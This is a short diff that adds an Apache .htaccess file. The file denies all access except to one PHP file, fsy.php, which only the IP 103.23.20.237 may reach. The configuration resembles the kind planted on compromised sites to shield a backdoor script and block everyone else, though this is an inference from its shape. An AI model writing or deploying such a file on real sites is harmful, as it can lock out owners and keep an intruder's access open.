@@ -1,0 +1,5 @@
+order deny,allow
+<FilesMatch "^fsy\.php$">
+Allow From 103.23.20.237
+</FilesMatch>
+deny from all
